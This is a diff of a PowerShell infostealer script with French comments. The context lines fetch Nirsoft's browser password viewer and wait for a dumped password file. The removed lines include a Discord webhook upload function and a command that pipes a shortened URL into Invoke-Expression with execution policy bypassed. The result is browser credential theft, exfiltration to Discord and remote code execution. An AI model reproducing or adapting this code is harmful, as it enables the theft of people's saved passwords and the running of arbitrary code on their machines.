@@ -62,37 +62,11 @@ function Get-Nirsoft {
     .\7z\7za.exe e wbpv.zip
 }
 
-
-# Function to upload content to Discord
-function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0,Mandatory=$False)]
-        [string]$file,
-        [parameter(Position=1,Mandatory=$False)]
-        [string]$text 
-    )
-
-    $Body = @{
-        'username' = $env:username
-        'content' = $text
-    }
-
-    if (-not ([string]::IsNullOrEmpty($text))){
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
-    }
-
-    if (-not ([string]::IsNullOrEmpty($file))){
-        curl.exe -F "file1=@$file" $DiscordUrl
-    }
-}
-
-
 # Chemin du fichier à surveiller
 $filePath = "c:\temp\w3b_br0ws3r_p4ssw0rds.txt"
 
 # Fonction pour attendre la création du fichier
-function Wait-FileCreation {
+function WaitBrowserPass {
     param (
         [string]$Path,
         [int]$TimeoutInSeconds = 60
@@ -105,15 +79,4 @@ function Wait-FileCreation {
     }
 
     return (Test-Path $Path)
-}
-
-# Call TempDir function
-TempDir
-
-# Attendre que le fichier soit créé
-if (Wait-FileCreation -Path $filePath) {
-    # Le fichier a été créé, exécuter la commande
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$dc='${dc}'; $db='${db}'; irm https://shorturl.at/rLQS5 | iex"
-} else {
-    Write-Host "Le fichier n'a pas été créé dans le délai imparti."
 }
